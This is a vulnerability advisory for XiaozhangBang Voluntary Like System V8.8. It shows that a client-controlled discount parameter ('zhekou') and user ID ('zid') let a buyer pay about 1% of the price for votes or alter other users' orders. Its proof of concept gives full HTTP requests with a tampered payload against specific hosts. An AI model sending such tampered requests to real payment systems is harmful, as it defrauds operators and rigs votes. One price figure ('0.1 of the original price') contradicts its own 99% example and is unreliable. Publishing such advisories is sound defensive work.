# Security Advisory: Incorrect Access Control in XiaozhangBang Voluntary Like System V8.8

## Summary
An **Incorrect Access Control** vulnerability has been identified in **XiaozhangBang Voluntary Like System V8.8**.  
The application fails to properly enforce server-side access control checks on critical parameters during the voting payment process. Specifically, the `zhekou` (discount) parameter can be modified by the client without validation, allowing unauthorized discounts and manipulation of the vote-purchasing mechanism. Additionally, an attacker can modify the `zid` parameter to affect other users' purchases, amplifying the impact.

## Affected Product
- **Vendor:** XiaozhangBang  
- **Product:** Voluntary Like System  
- **Version:** V8.8 (and possibly earlier versions)  
- **Component:** Voting / Payment Module

## Vulnerability Type
- **CWE-284: Improper Access Control**  
- **CWE-285: Improper Authorization**

## Technical Details

### Step 1 – Start Vote
An attacker modifies the `zhekou` parameter in the payment request.  
For example, changing `zhekou=100` (full price) to `zhekou=1` results in an unauthorized discount of 99%, effectively allowing the purchase at only 0.1 of the original price (200 RMB reduced to 2 RMB). By also modifying the `zid` parameter, the attacker can manipulate purchases for other users.

```http
POST /topfirst.php?g=Wap&m=Pay&a=wechat&token=6fK5tvIPejkkD9xm&id=3460&zid=183803 HTTP/1.1
Host: 4444-2.gsthtlj.com
Content-Type: application/x-www-form-urlencoded

price=10&orderName=%E4%BA%BA%E6%B0%94%E7%A5%A8&num=20&zhekou=1&lid=595&vote=30&vid=3460&uid=183803&pic=1&niming=1&__hash__=f62d9f80fd6a1a6198fd1b8106c2ba08_0a26a0a7851620044cf54e941dae1990
```

### Step 2 – WeChat Pay
The manipulated order is processed by the payment gateway with the unauthorized discounted price.

```http
GET /topfirst.php?g=Wap&m=Pay&a=wechat&token=6fK5tvIPejkkD9xm&id=3460&zid=183803&code=071Iiz1006u1OU1x0E200UobzQ3Iiz1f&state=STATE HTTP/1.1
Host: 4444-2.gsthtlj.com
```

### Step 3 – Payment Confirmation
The system confirms the payment and grants the attacker votes at the manipulated cost:

```http
GET /topfirst.php?g=Wap&m=Pay&a=success&no=wz2025082118381261957652541019 HTTP/1.1
Host: 534534.down444.zqkj1688.net.cn
```

## Impact
- **Financial Loss:** Unauthorized discounts lead to significant revenue loss.  
- **Integrity Violation:** Attackers can unfairly manipulate vote counts for themselves and other users.  
- **Access Control Failure:** Critical business logic (pricing/discounts) is not properly protected by server-side authorization checks.  

### CVSS v3.1 Score (Estimated)
- **Vector:** AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
- **Base Score:** 7.1 (High)

## Proof of Concept
By modifying the value of `zhekou`, an attacker can significantly reduce the payment required for purchasing votes. Manipulating `zid` allows the same effect for other users.

## Recommendation
- Enforce strict **server-side access control** for all pricing and discount parameters.  
- Do not rely on client-supplied values such as `zhekou` to calculate transaction amounts.  

## Timeline
- **2025-08-21:** Vulnerability discovered and verified.  
- **2025-08-24:** Public disclosure prepared.  

## References
- CWE-284: [https://cwe.mitre.org/data/definitions/284.html](https://cwe.mitre.org/data/definitions/284.html)  
- CWE-285: [https://cwe.mitre.org/data/definitions/285.html](https://cwe.mitre.org/data/definitions/285.html)  

---

**Disclosure Note:**  
This advisory is published for the benefit of developers, security researchers, and system administrators to mitigate the issue before it can be exploited at scale.